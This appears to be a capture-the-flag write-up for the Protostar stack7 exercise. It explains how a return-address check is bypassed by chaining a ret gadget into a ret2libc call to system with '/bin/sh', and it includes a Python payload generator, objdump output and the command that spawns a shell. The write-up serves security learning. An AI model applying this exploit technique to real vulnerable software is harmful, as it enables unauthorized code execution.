<h2>Goal</h2>
https://exploit-exercises.com/protostar/stack7/

This challenge is very similar to stack 6.  The only difference is that there is a check on the first `RET`.  The check is makes sure that ret does not start with a `b`. ` if((ret & 0xb0000000) == 0xb0000000)`  Then we get the prinft statement, the same as the last challenge.  

So how can we get around this?  Add in a valid `RET` address after the junk to fill the buffer, and then add in the system address, exit address and then either shellcode or an address of command to execute.  I will be using the same process as stack6, of finding "/bin/sh" within libc and using that memory value.  For details on how to find this, refer to the [stack6 writeup ](https://github.com/Freakazoidile/ctf_challenges/blob/master/exploit-exercises/protostar/stack6.md)


After finding the point at which `$EIP` control is gained, same as last time, 80 bytes to fill the buffer, than control at 81 I needed to get past the check. Time to put in a valid `RET`

<h2>How to get a valid RET address?</h2>

```
#> objdump -d stack7 | grep ret
 8048383:	c3                   	ret    
 8048494:	c3                   	ret    
 80484c2:	c3                   	ret    
 8048544:	c3                   	ret    
 8048553:	c3                   	ret    
 8048564:	c3                   	ret    
 80485c9:	c3                   	ret    
 80485cd:	c3                   	ret    
 80485f9:	c3                   	ret    
 8048617:	c3                   	ret 
 ```
 
**Common error**: I tried using the first `RET` address `0x8048383` and had a breakpoint set at the LEAVE instruction inside the getpath() function.  I filled the buffer with 80 chars, then put my address.  The break point did not get hit, the program exited.  I tried this again, changing my breakpoint thinking I am not fully understanding something. Again no hit.  After using `objdump` to print the entire stack7 executable I looked for my address `0x8048383`. It turns out I was jumping to somewhere that would completely avoid my breakpoint. 

So next I tried the last address, and viola the breakpoint hit and I could continue forward by finding the address of system, exit, libc and then the offset of "/bin/sh" within libc.  To see how to do this, go back to the stack6 writeup.

<h2>Solution</h2>

Here's the code that ended up working for me. 

```
import struct

buf="A"*80

addr=struct.pack("I", 0x8048617)
system=struct.pack("I", 0xb7ecffb0)
exit=struct.pack("I", 0xb7ec60c0)
env=struct.pack("I", 0xb7e97000+0x11f3bf)

print buf+addr+system+exit+env
```

I used this to print the output to a file and in GDB ran stack7 with the output of the above as input `r < /tmp/exploitoutput`, the program stated it had exited cleanly, meaning the the exit we sent it had executed.  Time to exit GDB and run this to get a shell.

`(python /tmp/gen ; cat) | ./stack7`

Success!
